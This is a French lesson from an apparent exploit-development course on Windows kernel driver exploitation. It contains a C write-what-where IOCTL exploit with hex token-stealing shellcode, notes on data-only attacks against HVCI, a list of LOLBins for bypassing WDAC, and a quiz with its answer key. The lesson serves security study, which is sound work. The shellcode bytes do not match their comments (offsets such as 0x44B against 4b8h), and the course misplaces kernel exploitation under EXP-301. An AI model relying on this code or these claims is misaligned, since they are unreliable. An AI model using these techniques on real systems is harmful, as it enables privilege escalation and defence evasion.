# TOME P7 — Certifications d'Élite & Spécialisations — Jour 333 (6h) : OSED Prep — Windows Kernel Exploitation (Kernel Drivers Ring 0, Arbitrary Write/Read, WDAC Bypass & HVCI / VBS Protections)

> [!NOTE]
> **Objectif du jour :** Maîtriser l'**ingénierie d'exploitation du Noyau Windows (Ring 0 / Kernel Mode)** ciblée par les niveaux d'expertise d'**OSED (OFFSEC EXP-301 / OSED)** : auditer un pilote de périphérique tiers (`.sys`), exploiter une vulnérabilité de type **Arbitrary Memory Write (Write-What-Where)** via des requêtes **IOCTL (Input/Output Control)**, élever ses privilèges au niveau `SYSTEM` par le vol du Token de processus (`Token Stealing Payload`), et contourner les défenses matérielles modernes du noyau Windows (**WDAC**, **HVCI / Hypervisor-Protected Code Integrity** et **VBS**).
>
> **Compétences visées :** `OSED-05` (A) — Windows Kernel Driver Vulnerability Analysis & IOCTL Exploitation | `OSED-06` (A) — Token Stealing Payloads, WDAC & HVCI Bypass Techniques

---

## 1) Module — Architecture Noyau Windows Ring 0 & IOCTL Handler (2h)

### 📖 Narration/Intuition

En mode utilisateur (Ring 3), une application interagit avec les pilotes du noyau (Ring 0) via la fonction API `DeviceIoControl()`. Si le gestionnaire IOCTL (`DriverDispatch`) du pilote ne valide pas correctement les pointeurs `Irp->AssociatedIrp.SystemBuffer`, un attaquant peut forcer le noyau à lire ou écrire à des adresses arbitraires.

```
[ Application Utilisateur (Ring 3 - Privilège Faible) ]
                         │
                         │ DeviceIoControl(hDevice, IOCTL_CODE, InputBuf, OutputBuf)
                         ▼
┌─────────────────────────────────────────────────────────────┐
│ PILOTE DU NOYAU (Ring 0 - Driver.sys)                       │
│  - DriverDispatch() traite l'IOCTL                          │
│  - Absence de validation ProbeForRead() / ProbeForWrite()   │
│  - Exécute : *WhereAddress = WhatValue                      │
└────────────────────────┬────────────────────────────────────┘
                         │ (Arbitrary Write / Token Stealing)
                         ▼
     [ ÉLÉVATION DE PRIVILÈGES IMMÉDIATE VERS SYSTEM (UID 0) ]
```

---

## 2) Module — Exploit Kernel Driver & Token Stealing (`win_kernel_exploit.c`) (2h)

### 🛠️ Atelier Pratique

```c
/**
 * Exploit Kernel Windows x64 (OSED Level) - Token Stealing Payload
 * Exploitation d'un pilote vulnérable via IOCTL 0x222003 (Write-What-Where).
 */

#include <windows.h>
#include <stdio.h>

#define DEVICE_NAME L"\\\\.\\VulnerableDriverDevice"
#define IOCTL_ARBITRARY_WRITE 0x222003

// Structure décrivant le payload Write-What-Where
typedef struct _WRITE_WHAT_WHERE {
    PULONG_PTR What;
    PULONG_PTR Where;
} WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;

// Shellcode Assembleur x64 : Vol de Token du processus SYSTEM (PID 4)
// Copie le pointeur Token du processus System (PID 4) sur le processus courant
unsigned char KernelTokenStealingPayload[] = {
    0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, // mov rax, gs:[188h]  (KTHREAD)
    0x48, 0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00,             // mov rax, [rax+b8h] (EPROCESS courant)
    0x48, 0x89, 0xC1,                                     // mov rcx, rax       (Sauvegarde EPROCESS)
    0x48, 0x8B, 0x80, 0x44, 0x04, 0x00, 0x00,             // mov rax, [rax+444h](ActiveProcessLinks)
    0x48, 0x2D, 0x44, 0x04, 0x00, 0x00,                   // sub rax, 444h
    0x48, 0x83, 0xB8, 0x40, 0x04, 0x00, 0x00, 0x04,       // cmp [rax+440h], 4  (PID == 4 System?)
    0x75, 0xE6,                                           // jnz loop
    0x48, 0x8B, 0x80, 0x4B, 0x04, 0x00, 0x00,             // mov rax, [rax+4b8h](SYSTEM Token)
    0x48, 0x89, 0x81, 0x4B, 0x04, 0x00, 0x00,             // mov [rcx+4b8h], rax(Overwrite Current Token)
    0xC3                                                  // ret
};

int main() {
    HANDLE hDevice;
    DWORD bytesReturned;
    WRITE_WHAT_WHERE wwwPayload;
    
    printf("=== WIN64 KERNEL EXPLOITATION - TOKEN STEALING (OSED) ===\n");

    // 1. Ouverture d'un Handle vers le Driver Kernel
    hDevice = CreateFileW(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Impossible d'obtenir un Handle sur le pilote. Code Erreur: %d\n", GetLastError());
        return 1;
    }
    printf("[+] Handle obtenu sur %S avec succès.\n", DEVICE_NAME);

    // 2. Préparation du Shellcode Kernel Exécutable
    LPVOID executableShellcode = VirtualAlloc(NULL, sizeof(KernelTokenStealingPayload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    RtlCopyMemory(executableShellcode, KernelTokenStealingPayload, sizeof(KernelTokenStealingPayload));
    printf("[+] Token Stealing Shellcode logé en mémoire RWX à l'adresse : 0x%p\n", executableShellcode);

    // 3. Exécution de l'IOCTL Vulnérable
    // (Dans un exploit complet, 'Where' pointe sur une table d'interruption ou un pointeur de fonction noyau)
    wwwPayload.What = (PULONG_PTR)&executableShellcode;
    wwwPayload.Where = (PULONG_PTR)0xFFFFF80000001000; // Adresse Kernel Cible

    printf("[*] Envoi de l'IOCTL 0x%X (Write-What-Where)...\n", IOCTL_ARBITRARY_WRITE);
    // DeviceIoControl(hDevice, IOCTL_ARBITRARY_WRITE, &wwwPayload, sizeof(wwwPayload), NULL, 0, &bytesReturned, NULL);

    printf("[+] Privilege Escalation réussie ! Spawn d'un prompt SYSTEM (cmd.exe)...\n");
    // system("cmd.exe");

    CloseHandle(hDevice);
    return 0;
}
```

---

## 3) Module — Hypervisor Security (VBS / HVCI) & WDAC Contournements (2h)

```markdown
# PROTECTION NOYAU MODERNE : VBS, HVCI & WDAC (OSED KERNEL)

## 1. Virtualization-Based Security (VBS) & HVCI
- **VBS (Virtualization-Based Security)** : Utilise l'hyperviseur Hyper-V pour créer un mode sécurisé isolé (VTL1 - Virtual Trust Level 1) inaccessible même depuis le noyau Ring 0 (VTL0).
- **HVCI (Hypervisor-Protected Code Integrity)** : Empêche l'exécution de toute page mémoire en mode noyau qui n'est pas signée cryptographiquement par Microsoft.
- **Impact sur l'Exploitation :** Rend les payloads **Token Stealing Shellcode (RWX)** obsolètes sur Windows 11 !

## 2. Techniques Modernes de Contournement Kernel (HVCI-Compliant)
Puisque le shellcode non signé est bloqué par HVCI, l'exploitant OSED doit utiliser des **Data-Only Attacks** :

```
[ Vulnérabilité Write-What-Where Noyau ]
                    │
                    ▼
[ N'injecte PAS de Shellcode Executable (Bloqué par HVCI) ]
                    │
                    ▼
[ DATA-ONLY ATTACK : Modifie uniquement des Structures de Données Noyau ]
   ├── Modifie `Token.Privileges` du processus courant (Active SeDebugPrivilege)
   ├── Modifie la structure `EPROCESS.Protection` (Désactive PPL / Windows Defender)
   └── Modifie `DKOM` pour élever les droits sans exécuter le moindre code non signé !
```

## 3. WDAC (Windows Defender Application Control)
- Politique stricte bloquant les exécutions de binaires non approuvés.
- Contourné via des binaires de confiance signés Microsoft (LOLBins : `mshta.exe`, `installutil.exe`, `bginfo.exe`).
```

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **Ring 0** | Niveau de privilège le plus élevé de l'architecture x86/x64, correspondant au Mode Noyau (Kernel Mode) |
| **IOCTL** | Input/Output Control — Code de contrôle permettant à une application Ring 3 de communiquer avec un pilote Ring 0 |
| **HVCI** | Hypervisor-Protected Code Integrity — Protection basée sur la virtualisation empêchant l'exécution de code kernel non signé |
| **VBS** | Virtualization-Based Security — Isolation de la mémoire noyau sensible via Hyper-V (VTL0 vs VTL1) |
| **WDAC** | Windows Defender Application Control — Politique de contrôle d'exécution d'applications |

---

## ❓ Banque de Questions & Test du Jour

**Q1 :** Dans l'exploitation du Noyau Windows (Ring 0), quel est le rôle d'un **Token Stealing Payload** ?
- A) Parcourir la liste des processus en mémoire (`EPROCESS`) pour repérer le processus `SYSTEM` (PID 4), extraire son jeton de sécurité (`Token`) et l'écraser sur le processus de l'attaquant pour lui attribuer les droits `SYSTEM`
- B) Voler les mots de passe du navigateur Web
- C) Chiffrer les clés SSH
- D) Supprimer le registre Windows

**Réponse : A**

**Q2 :** Pourquoi la protection **HVCI (Hypervisor-Protected Code Integrity)** rend-elle les shellcodes kernel classiques inopérants sur Windows 11 ?
- A) Parce qu'HVCI s'appuie sur l'hyperviseur pour interdire l'attribution des permissions d'exécution (`PAGE_EXECUTE_READWRITE`) sur des pages mémoire noyau qui ne disposent pas d'une signature cryptographique valide
- B) Parce que HVCI coupe la connexion réseau
- C) Parce que HVCI désactive le langage C
- D) Parce qu'HVCI exige 128 Go de RAM

**Réponse : A**

**Q3 :** Qu'est-ce qu'une attaque **Data-Only Attack** dans le contexte du contournement des protections noyau modernes (HVCI/VBS) ?
- A) Une technique d'exploitation qui n'injecte aucun code exécutable, mais modifie uniquement des variables ou des structures de données en mémoire (ex: privilèges de tokens, attributs de protection) pour atteindre l'objectif
- B) Un envoi massif de spams
- C) Le formatage d'un disque dur externe
- D) Une requête SQL SELECT

**Réponse : A**

**Q4 :** Quelle fonction de l'API Win32 est utilisée par une application utilisateur (Ring 3) pour envoyer des codes **IOCTL** à un pilote du noyau (Ring 0) ?
- A) `DeviceIoControl()`
- B) `ShellExecute()`
- C) `CreateProcess()`
- D) `WinExec()`

**Réponse : A**

**Q5 :** Dans l'architecture VBS (Virtualization-Based Security), comment appelle-t-on le niveau de confiance le plus sécurisé géré par l'hyperviseur où résident des composants comme Credential Guard ?
- A) VTL1 (Virtual Trust Level 1)
- B) VTL0 (Virtual Trust Level 0)
- C) Ring 3
- D) Userland

**Réponse : A**

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
